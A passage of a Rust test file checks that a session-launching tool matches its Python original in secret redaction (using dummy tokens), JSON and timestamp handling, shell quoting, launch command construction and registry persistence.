        ("eyJabcdefghijk.abcdefghijk.abcdefghijk".into(), "[hidden]"),
        ("AKIAABCDEFGHIJKLMNOPQ".into(), "AKIAABCDEFGHIJKLMNOPQ"),
        ("my_passwd:hunter2 next".into(), "my_passwd=[hidden] next"),
        (format!("ghs_{}", "a".repeat(20)), "[hidden]"),
        (format!("github_pat_{}", "A".repeat(22)), "[hidden]"),
    ];
    for (input, want) in cases {
        assert_eq!(redact(&input), want, "{input:?}");
    }
    // Printed by CPython 3.13: word boundaries next to non-ASCII word characters.
    let more: [(String, String); 4] = [
        ("K_KEY=1 \u{212a}".into(), "K_KEY=[hidden] \u{212a}".into()),
        (format!("{}_1", "a".repeat(41)), "[hidden]".into()),
        (format!("\u{663}{}1", "a".repeat(40)), format!("\u{663}{}1", "a".repeat(40))),
        (format!("{}1é", "x".repeat(40)), format!("{}1é", "x".repeat(40))),
    ];
    for (input, want) in more {
        assert_eq!(redact(&input), want, "{input:?}");
    }
}

#[test]
fn flat_clip_and_uuid_match_python() {
    assert_eq!(flat("  a  b\u{1c} c ", 3), "a…");
    assert_eq!(clip(" abcdef ", 4), "abc…");
    assert_eq!(flat("short", 80), "short");
    // Python's `$` lets one trailing newline through.
    assert!(is_uuid(&format!("{SID}\n")) && !is_uuid(&format!("{SID}\n\n")) && !is_uuid(&SID.to_uppercase()));
    assert_eq!(launch_argv("nope", "t", Path::new("/m"), "claude"), Err(NotASessionId));
}

#[test]
fn json_dumps_matches_python() {
    // Expected text printed by Python's json.dumps(..., indent=1).
    let v = json!({"a": [1.0, 1e16, 1e-5, 0.0001, 123456789.123, {}], "b": [], "c": "é😀\"\\\n"});
    let want = "{\n \"a\": [\n  1.0,\n  1e+16,\n  1e-05,\n  0.0001,\n  123456789.123,\n  {}\n ],\n \"b\": [],\n \"c\": \"\\u00e9\\ud83d\\ude00\\\"\\\\\\n\"\n}";
    assert_eq!(py::dumps(&v, Some(1)), want);
    assert_eq!(py::dumps(&json!({"a": [1, "x"], "b": {"c": null}}), None), "{\"a\": [1, \"x\"], \"b\": {\"c\": null}}");
}

#[test]
fn a_registry_python_wrote_loads_as_python_reads_it_and_saves_as_python_writes_it() {
    let tmp = TempDir::new().unwrap();
    let home = tmp.path();
    let rows = json!({"sessions": [
        {"sid": SID, "created_at": 1000, "title": 5, "token_hash": "h", "window_id": "12", "stopped": 1, "ended_at": "2.5"},
        {"sid": OTHER, "created_at": "x"},
        {"sid": "21111111-2222-4333-8444-555555555555", "created_at": 2e9, "title": ["a", {"k": null}], "window_id": 3.9,
         "tty": "/dev/ttys1", "client_id": "é"},
        {"sid": "31111111-2222-4333-8444-555555555555", "window_id": "1.5"},
        {"sid": "NOPE"}, 7]});
    std::fs::write(home.join(REGISTRY_NAME), rows.to_string()).unwrap();
    let work = WorkSessions::new(Options {
        root: Some(home.join("w")),
        home: Some(home.to_path_buf()),
        osascript: never(),
        clock: Arc::new(|| 2e9 + 1.0),
        environ: Some(Environ::new()),
        ..Options::default()
    });
    {
        let records = work.records();
        assert_eq!(records.keys().collect::<Vec<_>>(), [SID, "21111111-2222-4333-8444-555555555555"]);
        let a = &records[SID];
        assert!(a.created_at == 1000.0 && a.title == "5" && a.window_id == Some(12) && a.stopped && a.ended_at == 2.5);
        assert!(a.phase == "idle" && a.last_activity == 1000.0);
        let b = &records["21111111-2222-4333-8444-555555555555"];
        assert!(b.title == "['a', {'k': None}]" && b.window_id == Some(3) && b.client_id == "é");
    }
    work.save();
    // Expected text printed by Python's WorkSessions._save on the same file (the stopped one is past KEEP_SECS).
    let want = "{\n \"sessions\": [\n  {\n   \"sid\": \"21111111-2222-4333-8444-555555555555\",\n   \"created_at\": 2000000000.0,\n   \"title\": \"['a', {'k': None}]\",\n   \"token_hash\": \"\",\n   \"client_id\": \"\\u00e9\",\n   \"window_id\": 3,\n   \"tty\": \"/dev/ttys1\",\n   \"transcript_path\": \"\",\n   \"stopped\": false,\n   \"ended_at\": 0.0\n  }\n ]\n}";
    assert_eq!(std::fs::read_to_string(home.join(REGISTRY_NAME)).unwrap(), want);
}

#[test]
fn iso_stamps_read_as_python_3_13_reads_them() {
    // Expected values printed by CPython 3.13's datetime.fromisoformat(...).timestamp().
    let cases: [(&str, Option<f64>); 17] = [
        ("2026-10-12T10:00:00.000Z", Some(1791799200.0)),
        ("2026-10-12T10:00:00.1+00:00", Some(1791799200.1)),
        ("2026-10-12T10:00:00.1234567+00:00", Some(1791799200.123456)),
        ("20261012T100000+00:00", Some(1791799200.0)),
        ("20261012T1000+00:00", Some(1791799200.0)),
        ("2026-10-12T10+00:00", Some(1791799200.0)),
        ("2026-10-12T1000+00:00", Some(1791799200.0)),
        ("2026-10-12T10:00:00,5+00:00", Some(1791799200.5)),
        ("2026-10-12T10:00:00+0530", Some(1791779400.0)),
        ("2026-10-12T10:00:00+05", Some(1791781200.0)),
        ("2026-10-12x10:00:00+00:00", Some(1791799200.0)),
        ("2026-10-12T10:00:00.000+00:00:30", Some(1791799170.0)),
        ("2026-10-12T10:00:00 ", None),
        ("2026-10-12T10:00.5+00:00", Some(1791799200.5)),
        ("2026-10-12T10:00:00.1234567x+00:00", Some(1791799200.123456)),
        ("2026-10-12T24:00:00+00:00", None),
        ("2026-10-12é10:00:00+00:00", Some(1791799200.0)),
    ];
    for (stamp, want) in cases {
        assert_eq!(py::iso_timestamp(stamp), want, "{stamp}");
    }
    assert_eq!(py::iso_timestamp("2026-10-12T"), None);
    assert_eq!(py::iso_timestamp("2026-10-12T10:00:00+00:00-01:00"), None);
    assert_eq!(epoch(Some(&json!(5))), 0.0);
}

#[test]
fn shlex_quote_matches_python() {
    assert_eq!(py::shlex_quote(""), "''");
    assert_eq!(py::shlex_quote("/opt/eve/bridge/.venv/bin/python"), "/opt/eve/bridge/.venv/bin/python");
    assert_eq!(py::shlex_quote("/Users/a b/work"), "'/Users/a b/work'");
    assert_eq!(py::shlex_quote("it's"), "'it'\"'\"'s'");
    assert_eq!(py::shlex_quote("é"), "'é'");
}

#[test]
fn the_native_launch_runs_this_crates_binary_and_server() {
    let launch = Launch::Native { launcher: "/opt/eve/bin/eve-work-sessions".into(), mcp: "/opt/eve/bin/eve-mcp".into() };
    assert_eq!(launch.line(Path::new("/w x"), SID), format!("cd '/w x' && exec /opt/eve/bin/eve-work-sessions launch {SID}"));
    let env: Environ = [("EVE_BRIDGE_SOCK".to_string(), "/tmp/s.sock".to_string())].into();
    let config = launch.mcp_config(SID, "tok", Some(&env));
    assert_eq!(
        py::dumps(&config, None),
        format!("{{\"mcpServers\": {{\"eve\": {{\"type\": \"stdio\", \"command\": \"/opt/eve/bin/eve-mcp\", \"args\": [], \"env\": {{\"EVE_MCP_SESSION\": \"{SID}\", \"EVE_MCP_TOKEN\": \"tok\", \"EVE_BRIDGE_SOCK\": \"/tmp/s.sock\"}}}}}}}}")
    );
}

#[test]
fn launch_refuses_a_bad_command_line_and_a_missing_task() {
    let tmp = TempDir::new().unwrap();
    let which = |_: &str| Some(PathBuf::from("/usr/local/bin/claude"));
    let mut ran = 0;
    let mut exec = |_: &str, _: &[String]| {
        ran += 1;
        Ok(())
    };
    assert_eq!(main_with(&["launch".into()], Some(tmp.path()), &which, &mut exec), 2);
    assert_eq!(main_with(&["launch".into(), "nope".into()], Some(tmp.path()), &which, &mut exec), 2);
    assert_eq!(main_with(&["launch".into(), SID.into()], Some(tmp.path()), &which, &mut exec), 1);
    write_private(&tmp.path().join("work").join(format!("{SID}.task")), "t").unwrap();
    let nowhere = |_: &str| None;
    assert_eq!(main_with(&["launch".into(), SID.into()], Some(tmp.path()), &nowhere, &mut exec), 127);
    assert_eq!(ran, 0);
}

#[tokio::test]
async fn a_hook_transcript_path_is_saved_and_survives_a_restart() {
    let tmp = TempDir::new().unwrap();
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, None);
    let sid = start_sid(&work, "hello").await;
    work.note("session_start", &json!({"session_id": sid, "transcript_path": "/t/x.jsonl"}));
    let again = make(tmp.path(), &mac, None, None);
    assert_eq!(again.records()[&sid].transcript_path, "/t/x.jsonl");
    assert_eq!(again.records()[&sid].window_id, Some(4321));
    assert_eq!(again.records()[&sid].tty, "/dev/ttys009");
}
